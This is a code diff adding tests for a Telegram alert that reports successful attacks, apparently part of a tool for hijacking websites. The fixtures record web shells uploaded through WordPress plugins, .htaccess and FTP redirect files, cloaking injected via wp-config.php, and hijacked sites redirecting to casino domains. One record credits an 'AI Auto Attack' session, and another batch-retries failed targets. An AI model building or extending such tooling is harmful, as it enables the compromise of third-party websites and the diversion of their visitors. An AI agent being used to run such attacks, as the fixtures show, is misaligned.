@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { sendVulnAlert, type VulnAlertData } from "./telegram-notifier";
+import { sendVulnAlert, sendAttackSuccessAlert, type VulnAlertData, type AttackSuccessData } from "./telegram-notifier";
 
 describe("Vulnerability Alert Notifications", () => {
   it("should export sendVulnAlert function", () => {
@@ -87,5 +87,115 @@ describe("Vulnerability Alert Notifications", () => {
       console.log("No TELEGRAM_CHAT_ID set, skipping multi-chat test");
       expect(true).toBe(true);
     }
+  });
+});
+
+describe("Attack Success Alert Notifications", () => {
+  it("should export sendAttackSuccessAlert function", () => {
+    expect(typeof sendAttackSuccessAlert).toBe("function");
+  });
+
+  it("should accept AttackSuccessData with full details", async () => {
+    const data: AttackSuccessData = {
+      domain: "target.example.com",
+      method: "full_chain",
+      successMethod: "wp_plugin_upload",
+      redirectUrl: "https://casino-site.com",
+      uploadedUrl: "https://target.example.com/wp-content/uploads/shell.php",
+      verified: true,
+      durationMs: 45000,
+      details: "ลอง 3 วิธี สำเร็จด้วย wp_plugin_upload",
+    };
+
+    expect(data.domain).toBe("target.example.com");
+    expect(data.method).toBe("full_chain");
+    expect(data.successMethod).toBe("wp_plugin_upload");
+    expect(data.verified).toBe(true);
+    expect(data.durationMs).toBe(45000);
+
+    const result = await sendAttackSuccessAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle minimal attack success data", async () => {
+    const data: AttackSuccessData = {
+      domain: "minimal-target.com",
+      method: "redirect_only",
+      successMethod: "htaccess_write",
+    };
+
+    expect(data.domain).toBe("minimal-target.com");
+    expect(data.method).toBe("redirect_only");
+
+    const result = await sendAttackSuccessAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle pipeline success with partial verification", async () => {
+    const data: AttackSuccessData = {
+      domain: "pipeline-target.com",
+      method: "pipeline",
+      successMethod: "parallel_ftp_upload",
+      redirectUrl: "https://destination.com",
+      uploadedUrl: "https://pipeline-target.com/redirect.php",
+      verified: false,
+      durationMs: 120000,
+      details: "วางไฟล์สำเร็จ 3 ไฟล์ แต่ redirect ยังไม่ทำงาน",
+    };
+
+    expect(data.verified).toBe(false);
+    expect(data.durationMs).toBe(120000);
+
+    const result = await sendAttackSuccessAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle agentic_auto success data", async () => {
+    const data: AttackSuccessData = {
+      domain: "agentic-target.com",
+      method: "agentic_auto",
+      successMethod: "AI Auto Attack (Session #42)",
+      redirectUrl: "https://casino.com",
+      durationMs: 300000,
+      details: "AI โจมตีสำเร็จ 3 เป้าหมาย จาก 5 ที่ลอง",
+    };
+
+    expect(data.method).toBe("agentic_auto");
+
+    const result = await sendAttackSuccessAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle cloaking_inject success data", async () => {
+    const data: AttackSuccessData = {
+      domain: "cloaking-target.com",
+      method: "cloaking_inject",
+      successMethod: "php_cloaking",
+      uploadedUrl: "https://cdn.example.com/cloaking.js",
+      verified: true,
+      durationMs: 60000,
+      details: "Cloaking inject สำเร็จ — injected via wp-config.php",
+    };
+
+    expect(data.method).toBe("cloaking_inject");
+    expect(data.verified).toBe(true);
+
+    const result = await sendAttackSuccessAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle batch retry success data", async () => {
+    const data: AttackSuccessData = {
+      domain: "batch_retry",
+      method: "retry_all_failed",
+      successMethod: "Batch Retry (5/20)",
+      durationMs: 600000,
+      details: "Retry 20 domains: 5 สำเร็จ, 10 ล้มเหลว, 5 ข้าม (หมดวิธี)",
+    };
+
+    expect(data.method).toBe("retry_all_failed");
+
+    const result = await sendAttackSuccessAlert(data);
+    expect(typeof result).toBe("boolean");
   });
 });
